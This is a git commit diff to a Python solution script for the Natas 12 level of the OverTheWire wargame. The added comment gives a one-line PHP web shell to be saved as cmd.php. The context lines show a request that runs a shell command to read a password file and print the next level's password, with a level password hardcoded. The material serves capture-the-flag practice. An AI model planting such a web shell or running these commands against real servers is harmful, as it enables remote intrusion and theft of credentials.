edf808928a40360cfcaab86da98347982b53adbe
Khalid emad <58134995+khaled1000emad@users.noreply.github.com>
2022-05-14 13:42:20 +0200

    Update natas12.py

--- natas - overthewire series/natas12.py
+++ natas - overthewire series/natas12.py
@@ -26,3 +26,5 @@ link = soup2.find("a")
 
 r3 = sess.get(url+link.text+"?l=cat /etc/natas_webpass/natas13", auth=("natas12", "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"))
 print("Natas 13 password:",r3.text)
+
+#You can use this as your shell : <?=system($_GET["l"]);?> , just save it in a file called cmd.php 
